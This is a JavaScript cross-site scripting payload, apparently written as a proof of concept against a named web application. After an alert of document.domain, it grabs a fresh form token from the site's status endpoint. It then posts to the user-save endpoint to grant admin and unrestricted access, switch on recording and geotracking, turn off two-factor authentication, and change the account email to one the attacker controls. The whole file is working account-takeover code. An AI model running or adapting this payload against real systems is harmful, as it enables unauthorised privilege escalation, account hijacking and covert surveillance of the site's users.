console.log('XSSED')
alert(document.domain);
(async () => {
    try {
        console.log("Step 1: Fetching formToken...");
        
        // 1. Get the current status to grab a fresh formToken
        const statusResponse = await fetch('https://harrywh1.zellowork.com/system/statusget?context=1');
        const statusData = await statusResponse.json();
        const token = statusData.context.formToken;

        if (!token) {
            throw new Error("Could not find formToken in the status response.");
        }

        console.log("Token acquired:", token);
        console.log("Step 2: Sending POST request to save user...");

        // 2. Prepare the form-urlencoded body
        const details = {
            'safestrings': 'true',
            'name': 'changed',
            'email': 'ambushneupane+xyz@gmail.com', // Your target email
            'phone': '',
            'admin': 'true',
            'unrestricted_access': 'true',
            'rec_on': 'true',
            'geotracking_on': 'true',
            'isAdmin': 'true',
            'formToken': token // Injected from step 1
        };

        // Standard body parameters from your request
        const formBody = new URLSearchParams(details);
        
        // Adding the rest of your provided flags
        formBody.append('full_name', 'changed');
        formBody.append('job', 'nothing');
        formBody.append('is_gateway', 'false');
        formBody.append('2fa[verified]', 'false');
        formBody.append('2fa[enabled]', 'false');

        // 3. Perform the POST
        const postResponse = await fetch('https://harrywh1.zellowork.com/user/save?context=1', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: formBody
        });

        const result = await postResponse.json();
        
        if (result.status === "OK") {
            console.log("%cSuccess!", "color: green; font-weight: bold;", "User updated successfully.");
        } else {
            console.error("Server returned an error:", result);
        }

    } catch (error) {
        console.error("Execution failed:", error);
    }
})();
